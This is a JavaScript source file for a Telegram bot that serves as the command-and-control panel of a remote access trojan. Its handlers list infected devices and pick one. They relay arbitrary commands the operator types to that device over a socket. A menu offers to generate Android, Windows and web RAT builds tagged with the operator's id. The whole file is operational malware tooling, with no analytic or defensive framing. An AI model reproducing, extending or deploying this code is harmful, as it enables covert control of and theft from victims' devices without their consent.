require("dotenv").config();
const crypto = require("./Crypto");
const commands = require("./Commands.json");
const ADMIN_ID = process.env.ADMIN;
const KEY = process.env.KEY;
const systemTags = ["/start","/ping","/status","/stop","/devices","/selected",'/options','/cmd','/cancel','/t']; //systam tags
let listenMessageOnce ; //bot.once() listener for command parameters
let listenMessageOnceNaming; //bot.once() listener for rat naming

//manage "/message"
const start=(msg,bot,admins)=>{
    const id = msg.chat.id; //user id
    const username = msg.chat.first_name; //username
    
    if(!admins[id]){
        if(id == ADMIN_ID){
            admins[id]={selected:undefined}; //add user to admin list
            bot.sendMessage(id,`Welcome *${username}*, You are Connected.`,{parse_mode:'Markdown'});
        }
    }
    else{
        bot.sendMessage(id,`You are Already Connected, *${username}*.\nUse /stop to quit`,{parse_mode:'Markdown'});
    }
}

//manage "/stop"
const stop=(msg,bot,admins)=>{
    const id = msg.chat.id; //user id
    const username = msg.chat.first_name; //username

    if(admins[id]){
        delete admins[id]; //remove user id from admin list
        bot.sendMessage(id,`Adiós *${username}*. See you Soon!`,{parse_mode:'Markdown'})
    }
}

//manage "/status"
const status=(msg,bot,admins)=>{
    const id = msg.chat.id; //user id
    const username = msg.chat.first_name; //username

    if(admins[id]){
        bot.sendMessage(id,`*${username}*, You are Connected!`,{parse_mode:'Markdown'})
    }
}

//manage "/devices"
const devices=(msg,bot,admins,devices)=>{
    const id = msg.chat.id;
    if(admins[id]){
        //if no devices are found
        if(Object.keys(devices).length === 0){bot.sendMessage(id,"No devices Found!")}
        else{
            let availableClientsObject = Object.keys(devices).map((device)=>{if(devices[device].ref == ADMIN_ID){return [{text:`${device} (${devices[device].os})`,callback_data:`${device}`}]}}).filter(element=>element!=undefined); //make clients in inline keyboard menu form
            
            const options = {reply_markup: JSON.stringify({inline_keyboard: availableClientsObject}),parse_mode:'Markdown'}; //inline keyboard options
            bot.sendMessage(id,"_Select a Device :_ ",options)
        }
    }
}

//manage "callback_query"
const callback_query=(msg,bot,admins,devices)=>{

    const id = msg.message.chat.id;
    const type = msg.message.text; //types of callback
    const data = msg.data;

    if(admins[id]){
        if(type == "Select a Device :"){
            if(devices[data]){
                admins[id].selected = data;
                const os = devices[admins[id].selected].os
                const keyboardOptions1 = {
                    reply_markup: {
                        keyboard: commands["android"],
                        resize_keyboard: true,
                        one_time_keyboard: true,
                    },
                parse_mode:'Markdown'
                };
                bot.sendMessage(id,`_Selected : _*${data} (${os})*`,keyboardOptions1);
                

            }
            else{
                bot.sendMessage(id,`*${data}* Not available right now.`)
            }
        }
        else if(type == "Select an Option :"){
            bot.sendMessage(id,`/cancel\nFormat : *_name*\neg:- *_client1*\nEnter RAT Name:`,{parse_mode:'Markdown'})
            const os = msg.data;
            listenNickname(bot,id,os)
        }
        
        bot.answerCallbackQuery(msg.id);
    }
    
}

//manage "/selected"
const selected=(msg,bot,admins,devices)=>{
    const id = msg.chat.id;
    if(admins[id]){
        if(devices[admins[id].selected]!=undefined){
            const os = devices[admins[id].selected].os
            bot.sendMessage(id,`_Selected : _*${admins[id].selected} (${os})*`,{parse_mode:'Markdown'})
        }
        else{
            bot.sendMessage(id,`No devices were selected`);
        }
        
        
    }

}

//manage "/options"
const options=(msg,bot,admins,devices)=>{
    const id = msg.chat.id;
    if(admins[id]){
        const options_array = [[{text:"Generate Android RAT",callback_data:"android"}],[{text:"Generate Windows RAT",callback_data:"windows"}],[{text:"Generate Web RAT",callback_data:"web"}]]
        const options = {reply_markup: JSON.stringify({inline_keyboard: options_array}),parse_mode:'Markdown'}; //inline keyboard options
        bot.sendMessage(id,"_Select an Option :_ ",options)
    }
}

//manage "//cancel" : abort entering value field
const abort=(msg,bot,admins)=>{
    const id = msg.chat.id;
    if(admins[id]){
        if(listenMessageOnce){
            bot.removeListener('message', listenMessageOnce);
        }
        if(listenMessageOnceNaming){
            bot.removeListener('message',listenMessageOnceNaming)
        }
        bot.sendMessage(id,`cancelled input field.`)
    }
}

//listen for commmands that requires values (commmand selection)
const listenValues=(bot,id,command,admins,devices)=>{
    listenMessageOnce=async(response)=>{
        const value = response.text;
        const commandAndValue = `${command}${value}`;
        if(!systemTags.includes(value)){
            const selected_device_name = admins[id].selected;
            //if device is available
            if(devices[selected_device_name]){
                devices[selected_device_name].socket.send(commandAndValue)
                let sentMessage = await bot.sendMessage(id,`Sent :  *${commandAndValue}*`,{parse_mode:'Markdown'})
                const reaction = [{ type: 'emoji', emoji: '👍' }];
                bot.setMessageReaction(id, sentMessage.message_id, {reaction: JSON.stringify(reaction)})
            }
            else{
                let sentMessage = await bot.sendMessage(id,`Device *${selected_device_name}* not available right now ,use /devices `,{parse_mode:'Markdown'})
            }
            
            
            
            
            await bot.removeListener("message",listenMessageOnce)
        }
    }
    
    bot.once("message",listenMessageOnce)
}

//listen for commands that requires values (rat naming)
const listenNickname=(bot,id,os)=>{
    listenMessageOnceNaming=async(response)=>{
        const value = response.text;
        bot.sendChatAction(id, 'upload_document');
        let name = value.substring(1); //remove the _ from name
        bot.sendMessage(id,crypto.Encrypt(JSON.stringify({name:name,os:os,ref:id}),KEY))
        
    }
    
    bot.once("message",listenMessageOnceNaming)
}


//manage "/message"
const message=async(msg,bot,admins,devices,ONLY_ADMIN_MODE)=>{
   
    const id = msg.chat.id; //user id
    const message = msg.text; //user message
    const message_id = msg.message_id; //message id
    const username = msg.chat.username; //username
    
    
    if(!systemTags.includes(message) && message && admins[id] && message[0]!="_"){
        const selected_device = admins[id].selected;//device selected by admin
        if(devices[selected_device]){
            const reaction = [{ type: 'emoji', emoji: '👍' }];
            bot.setMessageReaction(id, message_id, {reaction: JSON.stringify(reaction)});//send reaction emoji to message
            
            const splittedMessage = message.split("|");
            if(splittedMessage.length<=1){
                devices[selected_device].socket.send(splittedMessage[0])
                const sentMessage = await bot.sendMessage(id,`Sent :  *${message}*`,{parse_mode:'Markdown'})
                const reaction = [{ type: 'emoji', emoji: '👍' }];
                bot.setMessageReaction(id, sentMessage.message_id, {reaction: JSON.stringify(reaction)})
                console.log(`command is ${splittedMessage[0]}`)
            }
            else{
                if(message[0]!="|"){ //to avoid request values for result
                    const command = splittedMessage.shift();//store main command
                    let formatMessage = ""
                    splittedMessage.forEach(element => {
                        formatMessage+=`|${element}`
                    });

                    bot.sendMessage(id,`/cancel\nCommand: _${command}_\nFormat :  _${formatMessage}_\nEnter values : `,{parse_mode:'Markdown'});
                    listenValues(bot,id,command,admins,devices);
                }
            }
        }
        else{
            bot.sendMessage(id,`User *${selected_device}* Not available , use /devices`,{parse_mode:'Markdown'})
            const reaction = [{ type: 'emoji', emoji: '👎' }];
            bot.setMessageReaction(id, message_id, {reaction: JSON.stringify(reaction)});

        }
    }
    

}





//manage "/cmd"
const cmd=(msg,bot,admins,devices)=>{

}

//manage "polling_error"
const polling_error=(msg,bot,admins,devices)=>{

}



module.exports = {start,stop,status,callback_query,devices,selected,options,message,cmd,polling_error,abort}